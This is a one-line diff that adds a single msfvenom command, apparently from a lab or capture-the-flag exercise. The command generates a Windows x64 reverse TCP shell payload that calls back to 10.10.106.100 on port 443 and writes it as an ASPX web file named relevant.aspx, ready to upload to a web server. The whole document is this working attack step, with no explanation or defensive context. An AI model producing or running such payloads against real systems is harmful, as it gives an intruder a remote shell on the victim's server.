@@ -1,0 +1,1 @@
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.106.100 LPORT=443 -f aspx > relevant.aspx
